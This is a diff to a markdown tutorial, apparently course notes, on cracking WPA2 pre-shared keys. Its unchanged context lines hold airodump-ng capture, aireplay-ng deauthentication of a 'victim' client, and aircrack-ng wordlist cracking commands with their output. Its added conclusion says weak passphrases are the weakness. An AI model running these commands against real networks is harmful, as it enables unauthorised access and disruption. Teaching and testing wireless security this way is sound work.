@@ -78,7 +78,10 @@ title: Wireless sniffing
         root@kali:~#
         ```
     3. Hacking WPA2
-        1. Capture data from a specified BSSID
+
+        [More information about Wi-Fi Protected Access](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access)
+  
+        1. Capture data from a specified BSSID. We are seeking for the MAC address of the victim.
         ```
         root@kali:~# airodump-ng --bssid 68:FF:7B:45:A5:88 -c 1 -w tkip wlan1mon
 
@@ -94,7 +97,7 @@ title: Wireless sniffing
 
         root@kali:~#
         ```
-        2.While capturing data in one terminal, deautenticate the client in a second terminal.
+        2.While capturing data in one terminal, deautenticate the victim in a second terminal.
         ```
         root@kali:~# aireplay-ng --deauth 2 -a 68:FF:7B:45:A5:88 -c C0:33:5E:DD:CA:FD wlan1mon
         19:10:10  Waiting for beacon frame (BSSID: 68:FF:7B:45:A5:88) on channel 1
@@ -118,7 +121,7 @@ title: Wireless sniffing
 
         root@kali:~#
         ```
-        3. Resolving the PSK
+        3. Resolving the PSK. We make use of a list of known passwords.
         ```
         root@kali:~# aircrack-ng  -w /usr/share/john/password.lst ccmp-01.cap
         Opening ccmp-01.capease wait...
@@ -154,3 +157,6 @@ title: Wireless sniffing
             EAPOL HMAC     : 6F 1D 9E 64 3E 39 5C 16 55 FC CB B0 F7 B0 6B 77
         root@kali:~#
         ```
+6. Conclusion
+    
+    Pre-shared key WPA and WPA2 remain vulnerable to password cracking attacks if users rely on a weak password or passphrase.
